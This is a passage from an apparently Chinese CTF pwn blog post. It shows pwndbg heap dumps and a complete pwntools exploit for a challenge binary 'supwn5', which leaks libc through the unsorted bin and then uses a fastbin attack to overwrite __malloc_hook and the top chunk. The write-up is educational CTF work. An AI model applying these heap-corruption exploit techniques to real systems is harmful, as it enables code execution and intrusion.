0x0000000000000000</span><br><span class="line">0x7f06f2f30b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b40 &lt;main_arena+32&gt;:	0x0000000000000061	0x0000000000000000</span><br><span class="line">0x7f06f2f30b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00007f06f2f30b00	------&gt;topchunk</span><br><span class="line">0x7f06f2f30b80 &lt;main_arena+96&gt;:	0x0000000000000000	0x00007f06f2f30b78</span><br><span class="line">0x7f06f2f30b90 &lt;main_arena+112&gt;:	0x00007f06f2f30b78	0x00007f06f2f30b88</span><br><span class="line">pwndbg&gt; arena</span><br><span class="line">&#123;</span><br><span class="line">  mutex = 0, </span><br><span class="line">  flags = 0, </span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  top = 0x7f06f2f30b00 &lt;__memalign_hook&gt;, </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>通过上述,可以看到已经把 top_chunk 给改了,这里要注意一下 topchunk千万别是 0 ,注意一下偏移就好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">new(1)</span><br><span class="line">edit(5,&#x27;a&#x27;*8)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20gx 0x7f06f2f30b00-0x10</span><br><span class="line">0x7f06f2f30af0 &lt;_IO_wide_data_0+304&gt;:	0x00007f06f2f2f260	0x0000000000000000</span><br><span class="line">0x7f06f2f30b00 &lt;__memalign_hook&gt;:	0x00007f06f2bf1e20	0x0000000000000021</span><br><span class="line">0x7f06f2f30b10 &lt;__malloc_hook&gt;:	0x6161616161616161	0x0000000000000000</span><br><span class="line">0x7f06f2f30b20 &lt;main_arena&gt;:	0x0000000000000000	0x00007f06f2bf19e1</span><br><span class="line">0x7f06f2f30b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f06f2f30b40 &lt;main_arena+32&gt;:	0x0000000000000061	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>利用成功,完整 exp 见下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./supwn5&#x27;,aslr=2)</span><br><span class="line">elf = ELF(&quot;./supwn5&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(size):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;please input the size : \n&#x27;,str(size))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to delete\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which one do you want modify :\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;please input the content&#x27;,content)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendlineafter(&#x27;please chooice :\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;which node do you want to show\n&#x27;,str(ind))</span><br><span class="line"></span><br><span class="line">new(0x80)</span><br><span class="line">new(1)</span><br><span class="line">free(0)</span><br><span class="line">new(0x80)</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&#x27;the content is : \n&#x27;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&quot;\x00&quot;))</span><br><span class="line">print hex(leak)</span><br><span class="line">base = leak-3951480</span><br><span class="line">new(0x40)</span><br><span class="line">free(2)</span><br><span class="line">edit(1,p64(0)*3+p64(0x51)+p64(0x61))</span><br><span class="line">new(0x40)</span><br><span class="line">new(0x50)</span><br><span class="line">free(3)</span><br><span class="line">edit(2,p64(0)*9+p64(0x61)+p64(leak-0x40))</span><br><span class="line">new(0x50)</span><br><span class="line">new(0x50)</span><br><span class="line">edit(4,p64(0)*6+p64(leak-0x78))</span><br><span class="line">new(1)</span><br><span class="line">edit(5,&#x27;a&#x27;*8)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这个可以看到 fastbin–&gt;malloc_hook 还是比较简单的,但是构造起来很需要耐心.同时其实我这个 unlink 偷懒了,完全可以很稳的执行 system(‘&#x2F;bin&#x2F;sh’) 的,但我还是比较懒,直接向 free_hook 填的 one_gadget ,不过还好成功了.所以其实还是得少用 one_gadget ,这个还是下策</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/11/11/2019-11-11-strange_1/" data-id="cuidSomOXLWdzQwuUi6utVYLB" data-title="Some strange questions" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/11/11/2019-11-11-6th_week/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          sixth week
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/11/04/2019-11-04-5th_week/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">fifth week</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/01/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
